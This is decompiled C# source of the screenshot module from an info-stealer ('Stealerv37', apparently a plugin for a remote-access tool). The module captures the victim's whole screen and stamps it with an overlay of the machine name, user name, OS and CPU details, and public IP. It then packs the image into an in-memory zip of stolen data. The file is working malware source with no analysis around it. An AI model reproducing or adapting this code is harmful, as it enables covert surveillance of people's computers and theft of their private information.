// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Device.ScreenShot
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Windows.Forms;

#nullable disable
namespace Intelix.Targets.Device;

public class ScreenShot : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    Rectangle bounds = Screen.PrimaryScreen.Bounds;
    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb))
    {
      using (Graphics graphics = Graphics.FromImage((Image) bitmap))
      {
        IntPtr hdc = graphics.GetHdc();
        IntPtr windowDc = NativeMethods.GetWindowDC(NativeMethods.GetDesktopWindow());
        NativeMethods.BitBlt(hdc, 0, 0, bounds.Width, bounds.Height, windowDc, 0, 0, 13369376);
        graphics.ReleaseHdc(hdc);
        NativeMethods.ReleaseDC(NativeMethods.GetDesktopWindow(), windowDc);
        graphics.SmoothingMode = SmoothingMode.AntiAlias;
        graphics.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
        RectangleF rectangleF = new RectangleF(0.0f, 0.0f, (float) bounds.Width, (float) bounds.Height);
        StringFormat format = new StringFormat()
        {
          Alignment = StringAlignment.Center,
          LineAlignment = StringAlignment.Center
        };
        float emSize1 = Math.Max(24f, (float) bounds.Width / 12f);
        using (Font font = new Font("Segoe UI Black", emSize1, FontStyle.Bold, GraphicsUnit.Pixel))
        {
          using (GraphicsPath path = new GraphicsPath())
          {
            path.AddString("Xorium", font.FontFamily, (int) font.Style, font.Size, rectangleF, format);
            int num1 = 10;
            for (int index = num1; index >= 1; --index)
            {
              int alpha = (int) (30.0 * (1.0 - (double) index / (double) num1)) + 8;
              float width = emSize1 / 18f * (float) index;
              using (Pen pen = new Pen(Color.FromArgb(alpha, 120, 40, 200), width))
              {
                pen.LineJoin = LineJoin.Round;
                graphics.DrawPath(pen, path);
              }
            }
            using (LinearGradientBrush linearGradientBrush = new LinearGradientBrush(rectangleF, Color.FromArgb((int) byte.MaxValue, 85, 0, (int) byte.MaxValue), Color.FromArgb((int) byte.MaxValue, 0, 220, (int) byte.MaxValue), LinearGradientMode.Horizontal))
            {
              linearGradientBrush.InterpolationColors = new ColorBlend()
              {
                Colors = new Color[4]
                {
                  Color.FromArgb((int) byte.MaxValue, 48 /*0x30*/, 0, 96 /*0x60*/),
                  Color.FromArgb((int) byte.MaxValue, 102, 0, 204),
                  Color.FromArgb((int) byte.MaxValue, 0, 150, (int) byte.MaxValue),
                  Color.FromArgb((int) byte.MaxValue, 0, (int) byte.MaxValue, 180)
                },
                Positions = new float[4]
                {
                  0.0f,
                  0.45f,
                  0.75f,
                  1f
                }
              };
              using (PathGradientBrush pathGradientBrush = new PathGradientBrush(path))
              {
                pathGradientBrush.CenterColor = Color.FromArgb(220, (int) byte.MaxValue, (int) byte.MaxValue, (int) byte.MaxValue);
                pathGradientBrush.SurroundColors = new Color[1]
                {
                  Color.FromArgb(0, 0, 0, 0)
                };
                pathGradientBrush.CenterPoint = new PointF(rectangleF.Width * 0.5f, rectangleF.Height * 0.45f);
                graphics.FillPath((Brush) linearGradientBrush, path);
                graphics.FillPath((Brush) pathGradientBrush, path);
              }
            }
            using (Pen pen = new Pen(Color.FromArgb(220, (int) byte.MaxValue, (int) byte.MaxValue, (int) byte.MaxValue), Math.Max(2f, emSize1 / 28f)))
            {
              pen.LineJoin = LineJoin.Round;
              graphics.DrawPath(pen, path);
            }
            PointF[] pointFArray = new PointF[5]
            {
              new PointF(rectangleF.Width * 0.22f, rectangleF.Height * 0.38f),
              new PointF(rectangleF.Width * 0.33f, rectangleF.Height * 0.52f),
              new PointF(rectangleF.Width * 0.68f, rectangleF.Height * 0.4f),
              new PointF(rectangleF.Width * 0.6f, rectangleF.Height * 0.6f),
              new PointF(rectangleF.Width * 0.5f, rectangleF.Height * 0.3f)
            };
            foreach (PointF pointF in pointFArray)
            {
              float num2 = Math.Max(2f, emSize1 / 28f);
              using (SolidBrush solidBrush = new SolidBrush(Color.FromArgb(230, (int) byte.MaxValue, 250, 200)))
                graphics.FillEllipse((Brush) solidBrush, pointF.X - num2 / 2f, pointF.Y - num2 / 2f, num2, num2);
              using (SolidBrush solidBrush = new SolidBrush(Color.FromArgb(80 /*0x50*/, 150, 220, (int) byte.MaxValue)))
                graphics.FillEllipse((Brush) solidBrush, pointF.X - num2 * 2f, pointF.Y - num2 * 2f, num2 * 4f, num2 * 4f);
            }
          }
        }
        string fileName = Process.GetCurrentProcess().MainModule.FileName;
        string[] strArray = new string[12]
        {
          "Machine: " + Environment.MachineName,
          "User: " + Environment.UserName,
          string.Format("Time: {0:yyyy-MM-dd HH:mm:ss zzz}", (object) DateTimeOffset.Now),
          $".NET: {Environment.Version}",
          "CPU: " + CpuInfo.GetName(),
          $"CPU Cores: {CpuInfo.GetLogicalCores()}",
          "OS Product: " + WindowsInfo.GetProductName(),
          "OS Build: " + WindowsInfo.GetBuildNumber(),
          "OS Arch: " + WindowsInfo.GetArchitecture(),
          "Public ip: " + IpApi.GetPublicIp(),
          $"Build Name: {Path.GetFileName(Path.GetDirectoryName(fileName))}\\{Path.GetFileName(fileName)}",
          "Coded by @aesxor"
        };
        float emSize2 = Math.Max(12f, (float) bounds.Width / 120f);
        using (Font font = new Font("Segoe UI", emSize2, FontStyle.Regular, GraphicsUnit.Pixel))
        {
          float num3 = Math.Max(8f, emSize2 * 0.6f);
          float num4 = 0.0f;
          float num5 = 0.0f;
          foreach (string text in strArray)
          {
            SizeF sizeF = graphics.MeasureString(text, font);
            if ((double) sizeF.Width > (double) num4)
              num4 = sizeF.Width;
            if ((double) sizeF.Height > (double) num5)
              num5 = sizeF.Height;
          }
          float width = num4 + num3 * 2f;
          float height = (float) ((double) strArray.Length * (double) num5 + (double) num3 * 2.0);
          RectangleF rect = new RectangleF(12f, (float) ((double) bounds.Height - (double) height - 12.0), width, height);
          using (SolidBrush solidBrush = new SolidBrush(Color.FromArgb(180, 6, 6, 10)))
          {
            using (Pen pen = new Pen(Color.FromArgb(220, 60, 60, 80 /*0x50*/), 1f))
            {
              graphics.FillRectangle((Brush) solidBrush, rect);
              graphics.DrawRectangle(pen, rect.X, rect.Y, rect.Width, rect.Height);
            }
          }
          float x = rect.X + num3;
          float y = rect.Y + num3;
          using (SolidBrush solidBrush1 = new SolidBrush(Color.FromArgb(160 /*0xA0*/, 0, 0, 0)))
          {
            using (SolidBrush solidBrush2 = new SolidBrush(Color.FromArgb(240 /*0xF0*/, 245, 250, (int) byte.MaxValue)))
            {
              foreach (string s in strArray)
              {
                graphics.DrawString(s, font, (Brush) solidBrush1, new PointF(x + 1f, y + 1f));
                graphics.DrawString(s, font, (Brush) solidBrush2, new PointF(x, y));
                y += num5;
              }
            }
          }
        }
        using (MemoryStream memoryStream = new MemoryStream())
        {
          ImageCodecInfo encoder = (ImageCodecInfo) null;
          ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
          for (int index = 0; index < imageEncoders.Length; ++index)
          {
            if (string.Equals(imageEncoders[index].MimeType, "image/jpeg", StringComparison.OrdinalIgnoreCase))
            {
              encoder = imageEncoders[index];
              break;
            }
          }
          if (encoder != null)
          {
            Encoder quality = Encoder.Quality;
            EncoderParameters encoderParams = new EncoderParameters(1);
            encoderParams.Param[0] = new EncoderParameter(quality, 90L);
            bitmap.Save((Stream) memoryStream, encoder, encoderParams);
          }
          else
            bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
          byte[] array = memoryStream.ToArray();
          if (array == null || array.Length == 0)
            return;
          string entryPath = "screenshot.jpg";
          zip.AddFile(entryPath, array);
        }
      }
    }
  }
}
